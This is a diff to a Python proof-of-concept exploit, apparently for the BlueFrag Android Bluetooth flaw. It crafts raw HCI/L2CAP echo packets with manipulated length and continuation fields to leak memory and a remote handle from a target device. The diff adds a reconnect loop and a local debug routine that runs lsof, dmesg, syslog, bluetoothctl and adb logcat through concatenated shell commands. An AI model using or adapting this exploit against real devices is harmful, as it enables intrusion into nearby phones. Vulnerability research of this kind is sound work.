@@ -3,6 +3,7 @@ import os
 import socket
 import struct
 import time
+import subprocess
 from binascii import hexlify, unhexlify
 from thread import start_new_thread
 from random import randint, randrange
@@ -21,7 +22,7 @@ def recv_l2cap():
     global pkt
     global echo
     while True:
-        pkt = l2cap.recv(1024)
+        pkt = l2cap.recv(10240)
         if ord(pkt[0]) == 0x9: #ECHO RESP
             print "ECHO", hexlify(pkt)
             echo = pkt
@@ -56,6 +57,7 @@ hci.setsockopt(socket.SOL_HCI, socket.HCI_FILTER,'\xff\xff\xff\xff\xff\xff\xff\x
 hci.bind((0,))
 start_new_thread(recv_hci, ())
 
+'''
 while True:
     try:
         handle = 0
@@ -65,7 +67,18 @@ while True:
     except socket.error:
         print "Retry"
         import traceback; traceback.print_exc()
+        l2cap.close()
         time.sleep(1)
+'''
+connect_response = -1
+pid_l2cap = 0
+while connect_response != 0:
+    handle = 0
+    l2cap = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_L2CAP)
+    connect_response = l2cap.connect_ex((sys.argv[1], 0))
+    if (connect_response != 0):
+        print "Error. Response code: ", connect_response
+        l2cap.close()
 
 start_new_thread(recv_l2cap, ())
 
@@ -85,15 +98,34 @@ def send_echo_hci(ident, x, l2cap_len_adj=0, continuation_flags=0):
 
     hci.send("\x02" + hci_hdr + acl_hdr + l2cap_hdr + x)
 
+"""
+collecting informatino for verbose analysis
+"""
+def collect_debug_info(debug_iter):
+	output = subprocess.check_output("pgrep python", shell = True)
+	os.system("lsof -p " + str(output) + " > ~/BlueFrag_PoC/issue_2/" + str(debug_iter) + "-lsof-cur.txt")
+	os.system("sudo lsof -u root > ~/BlueFrag_PoC/issue_2/" + str(debug_iter) + "-lsof-all.txt")
+	os.system("sudo dmesg > ~/BlueFrag_PoC/issue_2/" + str(debug_iter) + "-dmesg.txt")
+	os.system("hciconfig -a > ~/BlueFrag_PoC/issue_2/" + str(debug_iter) + "-hciconfig.txt")
+	os.system("bluetoothctl show > ~/BlueFrag_PoC/issue_2/" + str(debug_iter) + "-bluetoothctl-show.txt")
+	os.system("bluetoothctl devices > ~/BlueFrag_PoC/issue_2/" + str(debug_iter) + "-bluetoothctl-devices.txt")
+	os.system("bluetoothctl info 80:1D:00:33:D8:82 > ~/BlueFrag_PoC/issue_2/" + str(debug_iter) + "-bluetoothctl-info.txt")
+	os.system("sudo cat /var/log/syslog > ~/BlueFrag_PoC/issue_2/" + str(debug_iter) + "-syslog.txt")
+	print "Debug info collected"
+
 def do_leak(ident=1):
     global echo
     echo = False
     send_echo_hci(0, "A"*(32))
     send_echo_hci(ident, "A"*70, l2cap_len_adj=2)
     send_echo_hci(ident+1, "B"*70, continuation_flags=1)
+    #send analysis if requested
+    if len(sys.argv) > 4:
+    	collect_debug_info(int(sys.argv[4]))
     while echo == False:
         pass
-
+    bluetooth_pid = subprocess.check_output("adb shell 'pgrep droid.bluetooth'", shell = True)
+    os.system("adb logcat --pid " + bluetooth_pid + " > ~/BlueFrag_PoC/issue_2/2-android-logcat.txt &")
     return echo
 
 print "Leaking remote handle"
@@ -111,7 +143,7 @@ else:
 #prepare the packet
 echo_payload_len = 640
 ident = 0x42
-l2cap_hdr = struct.pack("<BBH",0x8, ident, echo_payload_len) #command identifier len
+l2cap_hdr = struct.pack("<BBH", 0x8, ident, echo_payload_len) #command identifier len
 acl_hdr = struct.pack("<HH", len(l2cap_hdr) + echo_payload_len, 1) #len cid
 hci_hdr = struct.pack("<HH", remote_handle, len(acl_hdr) + len(l2cap_hdr) + echo_payload_len) #handle, len
 #This must match the packet length we use to trigger the packet
